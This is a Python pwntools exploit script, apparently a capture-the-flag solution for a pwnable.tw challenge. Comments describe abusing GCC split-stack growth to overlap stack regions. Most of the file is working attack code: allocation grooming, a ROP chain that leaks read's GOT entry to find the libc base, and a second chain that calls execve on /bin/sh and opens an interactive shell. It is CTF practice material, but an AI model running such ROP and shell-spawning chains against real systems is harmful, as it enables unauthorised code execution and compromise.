###https://gcc.gnu.org/wiki/SplitStacks
###Make use of generic_morestack generic_releasestack to facilitate splittable stack
###Growable stack does not release claimed memory page
###Thus it is possible to create such situations
###  stack2
###  mmaped
###  mmaped
###  stack1
###Then followed by stack rollback and freeing mmaped page
###  unused stack
###   hole
###   hole
###  stack1
###And grow back stack, and use stack3 unchecked lib function stack growth to overwrite stack2 content
###  stack2
###  stack3
###  mmaped
###  stack1
###This exploit doesn't work on remote server for whatever reason tho

from pwn import *

###Utils
def alloc(size,name):
    r.sendlineafter('choice:','1')
    r.sendlineafter('Size :',str(size))
    r.sendlineafter('allocator ?',name)

def malloc(size,name):
    r.sendlineafter('choice:','2')
    r.sendlineafter('Size :',str(size))
    r.sendlineafter('allocator ?',name)

def edit(data):
    r.sendlineafter('choice:','3')
    r.sendafter('Content :',data)

def create():
    r.sendlineafter('choice:','4')

def delete():
    r.sendlineafter('choice:','5')

def leave():
    r.sendlineafter('choice:','6')

###Addr
#  libc2.23
read_got = 0x603f78
read_plt = 0x400e48
write_plt = 0x400e18
bss = 0x604800
read_offset = 0xf6670

###ROPgadget
pop_rax = 0x40260d
pop_rdi = 0x40194e
pop_rsi = 0x4016df
pop_rdx_3 = 0x4026c5
pop_rbp = 0x400f30
leave = 0x401050
L_syscall = 0xbb7c5

###Exploit
r = remote('chall.pwnable.tw',10404)

create()

for i in range(3):
    alloc(0xfff,'nope')
    create()
alloc(0xd30,'nope')
create()
malloc(0x21000,'nope')
create()
malloc(0x22000,'nope')
create()
alloc(0x8f0,'nope')
for i in range(0x28):
    create()
for i in range(0x28):
    delete()
delete()
delete()
delete()
create()
malloc(0x43000,'nope')
for i in range(0x27):
    create()
create()
alloc(0x130,'nope')
edit(b'\x41'*0x130)
for i in range(0x21):
    create()
for i in range(0x27):
    create()
for i in range(0x26-9):
    create()
alloc(0x160,'nope')
for i in range(0x21+0x27+0x26-9):
    delete()
padding = b'\x00'*0x178
ROPchain = p64(pop_rdi)+p64(1)+\
           p64(pop_rsi)+p64(read_got)+\
           p64(pop_rdx_3)+p64(8)+p64(0)*3+\
           p64(write_plt)+\
           p64(pop_rdi)+p64(0)+\
           p64(pop_rsi)+p64(bss)+\
           p64(pop_rdx_3)+p64(0x100)+p64(0)*3+\
           p64(read_plt)+\
           p64(pop_rbp)+p64(bss)+\
           p64(leave)
payload = padding+ROPchain
edit(payload)
delete()
r.recvline()

read_addr = u64(r.recv(8))
libc_base = read_addr-read_offset
print(hex(libc_base))
ROPchain = p64(pop_rdi)+p64(bss)+\
           p64(pop_rsi)+p64(0)+\
           p64(pop_rdx_3)+p64(0)+p64(0)*3+\
           p64(pop_rax)+p64(0x3b)+\
           p64(libc_base+L_syscall)
argument = b'/bin/sh\x00'
payload = argument+ROPchain
r.send(payload)

r.interactive()
